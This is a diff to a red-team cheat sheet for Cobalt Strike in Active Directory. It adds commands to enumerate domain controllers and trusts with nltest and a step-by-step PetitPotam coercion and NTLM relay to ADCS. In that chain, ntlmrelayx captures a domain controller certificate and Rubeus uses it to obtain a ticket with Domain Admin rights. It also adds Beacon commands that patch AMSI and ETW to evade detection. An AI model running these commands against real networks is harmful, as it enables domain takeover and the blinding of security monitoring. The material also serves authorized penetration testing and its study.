@@ -68,6 +68,13 @@ powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
 execute-assembly SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
 ```
 
+Get domain trusts and domain controllers with built-in `nltest.exe` utility
+```
+# Get all domain controllers of a domain
+run nltest /dclist:domain.com
+# Get domain trusts
+run nltest /trusted_domains
+```
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
 
@@ -309,6 +316,31 @@ execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep
 execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
 ```
 
+### Coercion attacks
+#### [PetitPotam](https://github.com/topotam/PetitPotam) - NTLM relay to ADCS
+> PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
+- Requires ADCS web server enrollment enabled
+- Requries Kali running Impacket on target domain
+```
+# Find ADCS web server and verify if web enrollment is enabled by browsing to the URL: `http://ADCS-server.domain.com/certsrv/`
+run certutil.exe
+
+# Start NTLM relay server on Kali 
+python3 ntlmrelayx.py -t http://ADCS-server.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Force coercion via PetitPotam in Cobalt Strike Beacon - Observe "Attack Success!!!" in output if it worked
+run PetitPotam.exe <Kali-Listener-IP> <DC-IP>
+
+# NTLM relay output will have base64 ticket of target DC machine account
+# Use Rubeus to request TGT of DC machine account to esclate to Domain Admin
+execute-assembly Rubeus.exe asktgt /dc:<DC-IP> /domain:domain.com /user:<DC-Machine-account>$ /ptt /certificate:<base64-ticket-from-output>
+
+# Verify asktgt command worked by doing an 'ls' command on the DC
+ls \\<DC-IP>\c$
+```
+References:
+- [https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/](https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/)
+- [https://hakin9.org/domain-takeover-with-petitpotam-exploit/](https://hakin9.org/domain-takeover-with-petitpotam-exploit/)
 ------------------------------------------------------------------------------------------
 ## Defense Evasion
 
@@ -330,17 +362,20 @@ static_syscalls_shinject <PID> C:\beacon.bin
 syscalls_shspawn C:\beacon.bin
 ```
 
-### AMSI
-Test
-```
+### AMSI patch 
+[BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) for current process <br />
+`patchit amsi`
 
-```
+[boku7/InjectAmsiBypass](https://github.com/boku7/injectAmsiBypass) BOF <br />
+Patch AMSI in remote process
+`inject-amsiBypass <PID>`
 
-### ETW
-Test
-```
+### ETW patch
+[BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit) for current process <br />
+`patchit etw`
 
-```
+[ajpc500/BOFs](https://github.com/ajpc500/BOFs/) ETW patch for current process<br />
+`etw stop` / `etw start`
 
 ------------------------------------------------------------------------------------------
 ## Exploitation
@@ -523,4 +558,5 @@ execute-assembly C:\SharPersist.exe -t service -c "C:\Windows\System32\cmd.exe" 
 [Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md) 
 
 [SpectreOps Cobalt Strike command reference](https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf) 
+
 
